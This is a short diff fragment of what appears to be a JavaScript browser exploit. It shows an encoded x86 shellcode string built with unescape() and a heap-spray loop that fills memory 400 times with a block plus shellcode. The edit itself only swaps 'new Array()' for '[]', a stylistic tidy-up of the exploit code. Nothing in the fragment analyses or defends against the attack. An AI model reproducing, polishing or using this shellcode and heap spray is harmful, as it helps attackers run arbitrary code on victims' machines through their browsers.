@@ -86,7 +86,7 @@ var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
 
  
 
- var memory = new Array();
+ var memory = [];
  for (i = 0; i < 400; i++){ memory[i] = block + shellcode1 }
  
  var buf = unescape("%0A%0A%0A%0A");
